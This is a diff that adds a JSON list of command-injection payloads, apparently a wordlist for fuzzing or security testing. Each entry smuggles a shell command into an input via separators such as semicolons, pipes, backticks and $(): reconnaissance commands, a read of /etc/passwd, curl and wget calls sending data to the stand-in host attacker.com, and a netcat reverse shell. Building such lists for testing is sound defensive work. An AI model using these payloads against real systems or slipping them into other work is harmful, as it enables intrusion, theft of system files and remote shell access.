@@ -1,0 +1,20 @@
+[
+  "; id",
+  "| id",
+  "& id",
+  "` id`",
+  "$(id)",
+  "; ls",
+  "| ls -la",
+  "& whoami",
+  "` whoami`",
+  "$(whoami)",
+  "| echo ${PATH}",
+  "; cat /etc/passwd",
+  "| netstat -an",
+  "& ping -c 10 127.0.0.1",
+  "| nslookup attacker.com",
+  "` curl http://attacker.com/steal`",
+  "$(wget http://attacker.com/steal -O /tmp/data)",
+  "| nc attacker.com 4444 -e /bin/sh"
+]
